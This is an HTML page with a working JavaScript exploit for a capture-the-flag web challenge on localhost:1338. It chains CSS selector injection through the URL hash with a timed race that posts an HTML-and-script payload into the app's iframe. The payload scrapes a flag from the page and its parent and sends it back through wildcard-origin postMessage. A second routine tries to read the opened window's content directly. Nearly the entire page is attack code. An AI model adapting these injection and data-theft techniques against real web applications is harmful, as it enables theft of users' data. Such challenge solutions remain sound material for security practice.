<!DOCTYPE html>
<html>
<head>
    <title>Simple Flag Extractor</title>
</head>
<body>
    <div id="status">Starting simple exploit...</div>
    <div id="logs"></div>
    
    <script>
        function log(msg) {
            const logs = document.getElementById('logs');
            logs.innerHTML += `<p>${new Date().toISOString()}: ${msg}</p>`;
            console.log(msg);
        }
        
        async function simpleExploit() {
            log('Opening main application...');
            
            // Open the main application
            const win = window.open('http://localhost:1338/', '_blank');
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            log('Navigating to first file using CSS selector injection...');
            
            // Use CSS selector injection to access the first file (which should be the flag)
            // This exploits the querySelector vulnerability with location.hash
            win.location = 'http://localhost:1338/#file-,a.list-group-item:nth-child(1)';
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            log('Starting race condition to inject our payload...');
            
            // Race condition: try to inject our payload before the legitimate file loads
            let attempts = 0;
            const maxAttempts = 100;
            
            const raceInterval = setInterval(() => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(raceInterval);
                    log('Race condition attempts exhausted');
                    return;
                }
                
                try {
                    // Check if iframe exists
                    if (win.frames && win.frames.length > 0) {
                        log(`Attempt ${attempts}: Sending payload to iframe`);
                        
                        // Send our payload to extract the flag
                        win.frames[0].postMessage({
                            body: `
                                <script>
                                    // Extract flag from the page content
                                    const flagMatch = document.documentElement.innerHTML.match(/CTF\\{[^}]+\\}/);
                                    if (flagMatch) {
                                        parent.parent.postMessage({flag: flagMatch[0]}, '*');
                                    }
                                    
                                    // Also try to access parent document
                                    try {
                                        const parentContent = parent.document.documentElement.innerHTML;
                                        const parentFlag = parentContent.match(/CTF\\{[^}]+\\}/);
                                        if (parentFlag) {
                                            parent.parent.postMessage({flag: parentFlag[0]}, '*');
                                        }
                                    } catch(e) {}
                                    
                                    // Signal that our payload loaded
                                    parent.parent.postMessage({status: 'payload_loaded'}, '*');
                                <\/script>
                                <body>Payload injected successfully</body>
                            `,
                            mimeType: 'text/html'
                        }, '*');
                    }
                } catch (e) {
                    log(`Attempt ${attempts} failed: ${e.message}`);
                }
            }, 50); // Try every 50ms
            
            // Listen for messages from the injected payload
            window.addEventListener('message', (event) => {
                log(`Received message: ${JSON.stringify(event.data)}`);
                
                if (event.data && event.data.flag) {
                    log(`ðŸš© FLAG FOUND: ${event.data.flag}`);
                    alert(`Flag: ${event.data.flag}`);
                    document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${event.data.flag}</h2>`;
                    clearInterval(raceInterval);
                }
                
                if (event.data && event.data.status === 'payload_loaded') {
                    log('âœ… Payload successfully loaded in iframe');
                }
            });
        }
        
        // Alternative simpler approach - direct file access
        async function directFileAccess() {
            log('Trying direct file access approach...');
            
            const win = window.open('http://localhost:1338/', '_blank');
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Try to access the first file directly
            win.location = 'http://localhost:1338/#a,a.list-group-item:nth-child(1)';
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Listen for any content that might contain the flag
            const checkForFlag = setInterval(() => {
                try {
                    if (win.document && win.document.documentElement) {
                        const content = win.document.documentElement.innerHTML;
                        const flagMatch = content.match(/CTF\{[^}]+\}/);
                        if (flagMatch) {
                            log(`ðŸš© FLAG FOUND via direct access: ${flagMatch[0]}`);
                            alert(`Flag: ${flagMatch[0]}`);
                            document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${flagMatch[0]}</h2>`;
                            clearInterval(checkForFlag);
                        }
                    }
                } catch (e) {
                    // Cross-origin restrictions, expected
                }
            }, 500);
            
            // Stop checking after 30 seconds
            setTimeout(() => clearInterval(checkForFlag), 30000);
        }
        
        // Start both approaches
        document.getElementById('status').textContent = 'Running simple exploit approaches...';
        
        simpleExploit();
        
        // Try the direct approach after a delay
        setTimeout(directFileAccess, 5000);
        
        log('Simple exploit initiated. This should work for a 150pt challenge...');
    </script>
</body>
</html>
